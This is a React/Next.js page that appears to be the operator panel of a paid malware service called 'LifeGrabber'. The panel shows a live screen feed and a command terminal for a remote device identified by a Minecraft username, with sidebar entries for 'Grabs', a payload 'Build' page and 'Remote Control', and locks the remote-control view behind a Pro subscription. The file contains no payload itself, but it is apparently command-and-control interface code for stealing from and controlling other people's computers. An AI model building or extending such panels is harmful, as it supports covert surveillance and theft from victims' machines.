'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter, useParams } from 'next/navigation';

const colors = {
  bg: '#0a0a0f',
  surface: '#12121a',
  surfaceHover: '#1a1a24',
  border: 'rgba(255,255,255,0.06)',
  borderHover: 'rgba(255,255,255,0.12)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
  greenBg: 'rgba(34, 197, 94, 0.12)',
  red: '#ef4444',
  redBg: 'rgba(239, 68, 68, 0.12)',
  terminal: '#0d1117',
  terminalText: '#c9d1d9',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function UserStreamPage() {
  const router = useRouter();
  const params = useParams();
  const username = params.username;
  const [streamFrame, setStreamFrame] = useState(null);
  const [online, setOnline] = useState(false);
  const [activeTab, setActiveTab] = useState('terminal');
  const [chatInput, setChatInput] = useState('');
  const [chatHistory, setChatHistory] = useState([]);
  const [sending, setSending] = useState(false);
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);
  const chatEndRef = useRef(null);

  useEffect(() => {
    const checkPro = () => {
      fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
        .then(r => r.json())
        .then(p => { 
          setIsPro(p.is_pro); 
          setProChecked(true); 
        })
        .catch(() => { 
          setIsPro(false); 
          setProChecked(true); 
        });
    };

    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          checkPro();
          const interval = setInterval(checkPro, 5000);
          return () => clearInterval(interval);
        } else {
          setProChecked(true);
        }
      })
      .catch(() => setProChecked(true));
  }, []);

  useEffect(() => {
    if (!username || !proChecked || !isPro) return;
    const iv = setInterval(() => {
      fetch('/api/stream?username=' + encodeURIComponent(username))
        .then(r => r.json())
        .then(d => {
          if (d.frame) { setStreamFrame(d.frame); setOnline(true); }
          else { setStreamFrame(null); setOnline(false); }
        })
        .catch(() => setOnline(false));
    }, 500);
    return () => clearInterval(iv);
  }, [username, proChecked, isPro]);

  useEffect(() => {
    if (chatEndRef.current) chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
  }, [chatHistory]);

  const sendChat = async () => {
    if (!chatInput.trim() || sending) return;
    const msg = chatInput.trim();
    setChatInput('');
    setSending(true);
    setChatHistory(prev => [...prev, { from: 'you', text: msg, time: new Date() }]);
    try {
      await fetch('/api/chat/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msg }),
      });
    } catch (e) {}
    setSending(false);
  };

  const tabs = [
    { id: 'terminal', icon: '>', label: 'Live Screen & Terminal' },
    { id: 'files', icon: '📁', label: 'File Explorer' },
    { id: 'tasks', icon: '⚡', label: 'Task Manager' },
  ];

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!isPro) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: '#050508', color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
            Remote Control streams are only available for Pro users. Free trials cannot access this feature.
          </div>
          <button onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column', background: colors.surface }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" active onClick={() => router.push('/dashboard/remote-control')} />
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
        </div>
        <div>
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>

      <main style={{ flex: 1, padding: '28px 36px' }}>
        <div onClick={() => router.push('/dashboard/remote-control')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginBottom: 16, display: 'flex', alignItems: 'center', gap: 6 }}
          onMouseEnter={e => e.currentTarget.style.color = colors.text}
          onMouseLeave={e => e.currentTarget.style.color = colors.textDim}>
          ← Back to Devices
        </div>

        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <div style={{ position: 'relative' }}>
              <img src={'https://mc-heads.net/avatar/' + username + '/44'} alt="" style={{ width: 44, height: 44, borderRadius: 10 }} />
              <div style={{ position: 'absolute', bottom: -2, right: -2, width: 14, height: 14, borderRadius: '50%', background: online ? colors.green : colors.red, border: `3px solid ${colors.bg}` }} />
            </div>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontSize: 18, fontWeight: 700 }}>{username}</span>
                <span style={{ fontSize: 11, fontWeight: 600, color: online ? colors.green : colors.red, background: online ? colors.greenBg : colors.redBg, padding: '3px 10px', borderRadius: 5 }}>
                  {online ? 'ACTIVE SESSION' : 'OFFLINE'}
                </span>
              </div>
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '6px 14px', borderRadius: 8, background: online ? colors.greenBg : 'rgba(255,255,255,0.05)', border: `1px solid ${online ? 'rgba(34,197,94,0.3)' : colors.border}` }}>
            <div style={{ width: 8, height: 8, borderRadius: '50%', background: online ? colors.green : colors.textDim }} />
            <span style={{ fontSize: 13, fontWeight: 500, color: online ? colors.green : colors.textDim }}>{online ? 'Connected' : 'Disconnected'}</span>
          </div>
        </div>

        <div style={{ display: 'flex', gap: 0, borderBottom: `1px solid ${colors.border}`, marginBottom: 20 }}>
          {tabs.map(t => (
            <div key={t.id} onClick={() => setActiveTab(t.id)} style={{
              padding: '10px 18px', fontSize: 13, fontWeight: 500, cursor: 'pointer',
              color: activeTab === t.id ? colors.green : colors.textDim,
              borderBottom: activeTab === t.id ? `2px solid ${colors.green}` : '2px solid transparent',
              transition: 'all 0.15s ease',
            }}
            onMouseEnter={e => { if (activeTab !== t.id) e.currentTarget.style.color = colors.text; }}
            onMouseLeave={e => { if (activeTab !== t.id) e.currentTarget.style.color = colors.textDim; }}
            >
              {t.label}
            </div>
          ))}
        </div>

        {activeTab === 'terminal' && (
          <div style={{ display: 'flex', gap: 16, height: 'calc(100vh - 240px)' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
              <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                <div style={{ padding: '12px 16px', borderBottom: `1px solid ${colors.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 13, fontWeight: 600 }}>
                    <span style={{ color: colors.green }}>🖥</span> Live Screen Feed
                  </div>
                  <div style={{ display: 'flex', gap: 8 }}>
                    <button style={{ fontSize: 12, padding: '5px 12px', borderRadius: 6, background: online ? 'rgba(34,197,94,0.15)' : 'rgba(255,255,255,0.05)', color: online ? colors.green : colors.textDim, border: `1px solid ${online ? 'rgba(34,197,94,0.3)' : colors.border}`, cursor: 'pointer', fontWeight: 500 }}>
                      Start Live Feed
                    </button>
                    <button style={{ fontSize: 12, padding: '5px 12px', borderRadius: 6, background: 'rgba(239,68,68,0.15)', color: colors.red, border: `1px solid rgba(239,68,68,0.3)`, cursor: 'pointer', fontWeight: 500 }}>
                      End Session
                    </button>
                  </div>
                </div>
                <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#080810' }}>
                  {streamFrame ? (
                    <img src={streamFrame} alt="Live stream" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
                  ) : (
                    <div style={{ textAlign: 'center', color: colors.textDim }}>
                      <div style={{ width: 56, height: 56, borderRadius: '50%', background: 'rgba(255,255,255,0.05)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 12px', fontSize: 24 }}>📹</div>
                      <div style={{ fontSize: 14, fontWeight: 500, marginBottom: 4 }}>Live Feed Offline</div>
                      <div style={{ fontSize: 12 }}>Click 'Start Live Feed' to view and control the screen.</div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div style={{ width: 380, display: 'flex', flexDirection: 'column' }}>
              <div style={{ background: colors.terminal, border: `1px solid ${colors.border}`, borderRadius: 12, flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                <div style={{ padding: '12px 16px', borderBottom: `1px solid rgba(255,255,255,0.06)`, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 13, fontWeight: 600 }}>
                    <span style={{ color: colors.green }}>{'>'}_</span> Terminal
                    <span style={{ fontSize: 11, color: colors.textDim, background: 'rgba(255,255,255,0.06)', padding: '2px 8px', borderRadius: 4 }}>CHAT.EXE</span>
                  </div>
                  <button onClick={() => setChatHistory([])} style={{ fontSize: 11, padding: '4px 10px', borderRadius: 5, background: 'rgba(255,255,255,0.06)', color: colors.textDim, border: 'none', cursor: 'pointer' }}>
                    🗑 Clear
                  </button>
                </div>
                <div style={{ flex: 1, padding: 12, overflowY: 'auto', fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace', fontSize: 12, lineHeight: 1.6 }}>
                  <div style={{ color: colors.textDim, marginBottom: 8 }}>
                    <span style={{ color: '#58a6ff' }}>Microsoft Windows [Version 10.0.19045]</span>
                  </div>
                  <div style={{ color: colors.textDim, marginBottom: 12 }}>
                    <span>(c) Microsoft Corporation. All rights reserved.</span>
                  </div>
                  {chatHistory.map((c, i) => (
                    <div key={i} style={{ marginBottom: 4 }}>
                      <span style={{ color: c.from === 'you' ? colors.green : '#58a6ff' }}>{c.from === 'you' ? '> ' : '< '}</span>
                      <span style={{ color: c.from === 'you' ? colors.text : colors.terminalText }}>{c.text}</span>
                    </div>
                  ))}
                  <div ref={chatEndRef} />
                </div>
                <div style={{ padding: '10px 12px', borderTop: `1px solid rgba(255,255,255,0.06)`, display: 'flex', gap: 8 }}>
                  <span style={{ color: colors.green, fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace', fontSize: 13, lineHeight: '36px' }}>{'>'}</span>
                  <input
                    value={chatInput}
                    onChange={e => setChatInput(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter') sendChat(); }}
                    placeholder="Type a command..."
                    style={{
                      flex: 1, background: 'rgba(255,255,255,0.05)', border: `1px solid ${colors.border}`, borderRadius: 6,
                      padding: '8px 12px', color: colors.text, fontSize: 13, outline: 'none',
                      fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace',
                    }}
                    onFocus={e => e.target.style.borderColor = colors.borderHover}
                    onBlur={e => e.target.style.borderColor = colors.border}
                  />
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'files' && (
          <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>📁</span>
            <span style={{ fontSize: 14 }}>File Explorer coming soon</span>
          </div>
        )}

        {activeTab === 'tasks' && (
          <div style={{ background: colors.surface, border: `1px solid ${colors.border}`, borderRadius: 12, height: 300, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>⚡</span>
            <span style={{ fontSize: 14 }}>Task Manager coming soon</span>
          </div>
        )}
      </main>
    </div>
  );
}